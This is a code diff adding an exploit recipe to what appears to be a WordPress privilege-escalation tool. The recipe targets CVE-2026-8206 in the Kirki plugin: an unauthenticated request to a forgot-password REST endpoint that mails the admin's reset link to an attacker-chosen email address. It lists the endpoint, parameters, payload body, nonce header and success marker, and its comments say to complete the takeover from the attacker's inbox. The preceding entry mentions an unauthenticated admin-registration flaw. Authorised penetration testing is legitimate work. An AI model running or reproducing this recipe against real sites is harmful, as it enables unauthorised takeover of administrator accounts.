@@ -88,6 +88,36 @@ PRIVESC_RECIPES = [
         "source": "registry",
         "note": "ajax_register_handle honours lakit_bkrole → unauth admin registration.",
     },
+    {
+        "plugin": "kirki",
+        "cve": "CVE-2026-8206",
+        "affected": ">=6.0.0,<=6.0.6",
+        "kind": "account-takeover-oob",
+        "method": "POST",
+        "endpoint": "/wp-json/KirkiComponentLibrary/v1/kirki-forgot-password",
+        # CONFIRM-ONLY. The forgot-password REST route (CompLibFormHandler) has a
+        # missing permission check and trusts a client-supplied 'email', so it
+        # mails the reset link for `target_user` to an ATTACKER address. We can't
+        # read that mailbox, so the tool proves the primitive (200 + marker) and
+        # stops; completing the takeover is a manual step from the attacker inbox.
+        "target_user": "admin",
+        "user_param": "username",
+        "email_param": "email",
+        "attacker_email": "pentest@mail.invalid",
+        "extra_params": {
+            "emailSubject": "Password Reset",
+            "emailBody": '[{"type":"text","value":"Reset your password:\\n"},'
+                         '{"type":"chip","value":"reset_link"}]',
+        },
+        # WP REST nonce; the endpoint's missing-permission check usually ignores
+        # it, but send one when a page exposes it (wpApiSettings).
+        "nonce_header": "X-WP-ELEMENT-NONCE",
+        "success_marker": "Email sent",
+        "source": "registry",
+        "note": "Unauth arbitrary-email password reset (CVE-2026-8206, missing "
+                "permission check). Confirm-only: reset link is emailed to the "
+                "attacker; finish takeover from that mailbox.",
+    },
 ]
 
 
